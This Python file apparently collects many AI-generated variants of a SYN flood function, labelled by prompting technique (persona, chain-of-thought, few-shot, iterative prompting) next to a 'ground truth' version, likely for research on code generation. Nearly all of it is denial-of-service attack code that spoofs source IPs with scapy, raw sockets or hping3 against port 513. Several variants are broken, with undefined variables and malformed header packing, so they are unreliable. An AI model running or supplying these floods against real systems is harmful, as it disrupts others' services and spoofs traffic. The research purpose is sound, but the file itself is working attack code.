from scapy.all import *
import socket
from struct import pack
import random
import struct
import sys    
import logging
import ipaddress
from random import randint


#Modifico il range  da (1024,1050) a (1024,1050) per scopi di testing
def ground_truth_code_synFlood(src, tgt):
    for sport in range(1024, 1050):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def persona_synFlood(src, tgt):
	from scapy.all import IP, TCP, send
	pkt = IP(src=src, dst=tgt)/TCP(dport=513, flags='S')
	for sport in range(1024, 1050):
		syn_pkt = pkt.sport(sport)
		send(syn_pkt, verbose=0)

def template_synFlood(src, tgt):
    try:
        from scapy.all import IP, TCP, sr1
        for sport in range(1024, 1050):
            packet = IP(src=src, dst=tgt) / TCP(sport=sport, dport=513, flags='S')
            send(packet, timeout=2, verbose=0)
    except Exception as e:
        pass

def question_refinement_synFlood(tgt,src):
	for sp in range(1024,1050):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((src,sp))
		s.connect_ex((tgt,513))
		s.close()

def alternative_approaches_synFlood(src, tgt):
    import os
    import subprocess
    for port in range(1024, 1050):
        try:
            command = ['hping3', '-S', '-p', str(port), '--flood', tgt]
            subprocess.Popen(command)
        except Exception as e:
            print(f"Error occurred on port {port}: {e}")

def context_manager_synFlood(src, tgt):
	rawSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	rawSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	target_ip = socket.gethostbyname(tgt)
	source_ip = src
	for source_port in range(1024, 1050):
		ipl = iphdr()
		ipl.src_address = sum([ord(x) << (8 * y) for y, x in enumerate(source_ip.split('.'))])
		ipl.dst_address = sum([ord(x) << (8 * y) for y, x in enumerate(target_ip.split('.'))])
		ipl.placeholder = 0
		ipl.protocol = socket.IPPROTO_TCP
		ipl.ttl = 50
		tcpl = tcphdr()
		tcpl.src_port = source_port
		tcpl.dst_port = int(tgt.split(':')[1])
		tcpl.sequence = 0
		tcpl.acknowledgement = 0
		tcpl.doff_reserved = 5
		tcpl.fin = 0
		tcpl.syn = 1
		tcpl.rst = 0
		tcpl.psh = 0
		tcpl.ack = 0
		tcpl.urg = 0
		tcpl.window = socket.htons(5840)
		tcpl.checksum = 0
		tcpl.urgent_pointer = 0
		rawSocket.sendto(ipl.pack() + tcpl.pack(), (target_ip , 0))


def flipped_interaction_3_synFlood(src, tgt):
    try:
        packet = IP(src=src, dst=tgt) / TCP(sport=sport, dport=target_port, flags=protocol_flags)
        send(packet, verbose=0)
        logging.info(f'Sent packet from {src}:{sport} to {tgt}:{target_port} with flags {protocol_flags}')
    except PermissionError as e:
        logging.critical(f'Permission error: {e}')
        raise
    except Exception as e:
        logging.error(f'Error sending packet from {src}:{sport} to {tgt}:{target_port} with flags {protocol_flags} - {e}')
    threads = []
    for sport in range(start_port, end_port + 1):
        thread = threading.Thread(target=send_packet, args=(sport,))
        threads.append(thread)
        thread.start()
        thread.join(timeout=0.01)
    for thread in threads:
        thread.join()

def flipped_interaction_4_synFlood(src, tgt):
	rate = 100
	max_packets = 1000
	packets_sent = 0
	from scapy.all import IP, TCP, send
	import time
	start_time = time.time()
	while packets_sent < max_packets:
		for sport in range(1024, 1050):
			try:
				syn_packet = IP(src=src, dst=tgt)/TCP(sport=sport, dport=513, flags='S')
				send(syn_packet, verbose=0)
				packets_sent += 1
				if packets_sent >= max_packets:
					break
				elapsed_time = time.time() - start_time
				if elapsed_time >= 1:
					time.sleep(max(0, 1 - elapsed_time))
				start_time = time.time()
			except Exception as e:
				print(f'Error sending packet: {e}')

def flipped_interaction_5_synFlood(src, tgt, packets_per_second=100, total_packets=50, random_ports=False):
    try:
        import scapy
    except ImportError:
        logging.warning("Scapy not found. Attempting to install Scapy...")
        os.system("pip install scapy")
        import scapy
    logging.info(f"Starting SYN flood attack from {src} to {tgt}")
    seq_number = 1000
    sent_packets = 0
    try:
        while sent_packets < total_packets:
            start_time = time.time()
            if random_ports:
                ports = random.sample(range(1024, 1050), min(packets_per_second, total_packets - sent_packets))
            else:
                ports = range(1024, 1050)
            for sport in ports:
                if sent_packets >= total_packets:
                    break
                syn_packet = IP(src=src, dst=tgt) / TCP(sport=sport, dport=513, flags='S', seq=seq_number)
                send(syn_packet, verbose=0)
                sent_packets += 1
                seq_number += 1
            elapsed_time = time.time() - start_time
            if elapsed_time < 1.0:
                logging.debug(f"Sleeping for {1.0 - elapsed_time:.2f} seconds")
                time.sleep(1.0 - elapsed_time)
            else:
                logging.warning(f"Packet sending rate exceeded, took {elapsed_time:.2f} seconds to send {packets_per_second} packets.")
            if sent_packets % packets_per_second == 0:
                logging.info(f"Sent {sent_packets} packets so far")
    except Exception as e:
        logging.error(f"An error occurred: {e}")
    finally:
        logging.info(f"SYN flood attack completed or interrupted. Total packets sent: {sent_packets}")

def iterative_prompting_3_synFlood(src, tgt):
    if not isinstance(src, str) or not isinstance(tgt, str):
        raise ValueError('Source and target addresses must be strings.')
    try:
        porthits = 0
        for srcport in range(1024, 1050):
            siphdr = IP(src=src, dst=tgt)
            synpkt = siphdr / TCP(dport=513, sport=srcport, flags='S')
            send(synpkt)
            porthits += 1
    except socket.error as e:
        print(f'Socket error: {e}')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

def iterative_prompting_4_synFlood(src, tgt):
    try:
        socket.inet_pton(socket.AF_INET, src)
        socket.inet_pton(socket.AF_INET, tgt)
    except (AttributeError, socket.error):
        try:
            socket.inet_aton(src)
            socket.inet_aton(tgt)
        except socket.error:
            raise ValueError('Invalid IP address provided.')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as e:
        raise PermissionError(f'Socket creation failed: {e}')
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as e:
        raise RuntimeError(f'Setsockopt failed: {e}')
    try:
        for source_port in range(1024, 1050):
            ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 0, 0, random.randint(1, 1050), 0, 64, 6, socket.inet_aton(src), socket.inet_aton(tgt))
            tcp_header = struct.pack('!HHLLBBHHH', source_port, 513, 0, 0, 0x50, 0, socket.htons(20), 0)
            s.sendto(ip_header + tcp_header, (tgt, 0))
    except socket.error as e:
        print(f'Failed to send SYN packet: {e}')
    finally:
        s.close()

def iterative_prompting_5_synFlood(src, tgt):
    try:
        if not isValidIP(src) or not isValidIP(tgt):
            return
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        for sport in range(1024, 1050):
            ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 512, random.randint(0, 1050), 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(tgt))
            tcp_header = struct.pack("!HHLLBBHHH", sport, 513, 0, 0, 5<<4, 2, 0, random.randint(0, 1050), 0)
            h = ip_header + tcp_header
            s.sendto(h, (tgt, 0))
    except socket.error as e:
        print(e)
    finally:
        try:
            s.close()
        except NameError:
            pass

def isValidIP(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except AttributeError:
        try:
            socket.inet_aton(ip)
            if ip == socket.inet_ntoa(socket.inet_aton(ip)):
                return True
        except socket.error:
            return False
    except socket.error:
        return False

def few_shots_prompting_synFlood(src, tgt):
	pkt = IP(src=src, dst=tgt)
	for sport in range(1024, 1050):
		SYN = pkt / TCP(sport=sport, dport=513, flags='S')
		send(SYN)

def cot_prompting_synFlood(src, tgt):
	pkt=IP(src=src,dst=tgt)/TCP(sport=(1024,1050),dport=513,flags='S')
	send(pkt)

def fact_check_list_synFlood(src, tgt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    src_addr = socket.inet_aton(src)
    dest_addr = socket.inet_aton(tgt)
    ip_header = pack('!BBHHHBBH4s4s', 4 << 4 | 5, 0, 40, randint(0, 1050), randint(0, 255), 64, 0, 0, src_addr, dest_addr)
    sport = randint(1024, 1050)
    dport = randint(1, 1050)
    seq = 0
    ack_seq = 0
    tcp_flag = 2
    tcp_header = pack('!HHLLBBHHH', sport, dport, seq, ack_seq, 5 << 4 | tcp_flag, 8 * 1024, 0, 0, 0)
    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = msg[i] + (msg[i+1] << 8)
            s = s + w
            s = s & 0xffff
        s = ~s & 0xffff
        return s
    psh_tcp = pack('!4s4sBBH', src_addr, dest_addr, 0, socket.IPPROTO_TCP, len(tcp_header))
    psh_pack = psh_tcp + tcp_header
    TCP_CHECKSUM = checksum(psh_pack)
    tcp_header = pack('!HHLLBBH', sport, dport, seq, ack_seq, 5 << 4 | tcp_flag, 8 * 1024, TCP_CHECKSUM)
    packet = ip_header + tcp_header
    sock.sendto(packet, (tgt, dport))

def not_interactive_mix_synFlood(src, tgt):
	if not isinstance(src, str) or not isinstance(tgt, str):
		raise ValueError("Both src and tgt must be strings representing IP addresses.")
	try:
		socket.inet_aton(src)
		socket.inet_aton(tgt)
	except socket.error:
		raise ValueError("Invalid IP address format in either src or tgt.")
	for sport in range(1024, 1050):
		ip = IP(src=src, dst=tgt)
		tcp = TCP(sport=sport, dport=513, flags='S')
		pkt = ip/tcp
		send(pkt)

def interactive_mix_synFlood(tgt, src):
    logger = logging.getLogger()
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
    try:
        ipaddress.IPv4Address(src)
    except ValueError as e:
        logger.error(f"Invalid source IP address: {src}")
        sys.exit(1)
    try:
        tgt_ip = socket.gethostbyname(tgt)
    except socket.gaierror as e:
        logger.error(f"Could not resolve target host: {tgt}")
        sys.exit(1)
    if os.getuid() != 0:
        logger.error("This script requires root privileges to send raw packets.")
        sys.exit(1)
    print("DISCLAIMER: This script performs a SYN flood attack, which can be illegal and unethical."
          "Use it only on systems you own or have explicit permission to test.")
    confirmation = input("Do you want to proceed? (y/n): ").strip().lower()
    if confirmation != 'y':
        logger.info("User aborted the script execution.")
        sys.exit(0)
    for sport in range(1024, 1050):
        try:
            ip_packet = IP(src=src, dst=tgt_ip)
            tcp_packet = TCP(sport=sport, dport=518, flags='S', seq=123456789)
            pkt = ip_packet / tcp_packet
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Failed to send packet with source port {sport}: {e}")

def baseline_synFlood(src, tgt):
	for sport in range(1024, 1050):
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		ip_header = IP(src=src, dst=tgt)
		tcp_header = TCP(sport=sport, dport=513, flags='S')
		packet = ip_header/tcp_header
		s.sendto(str(packet), (tgt, 0))

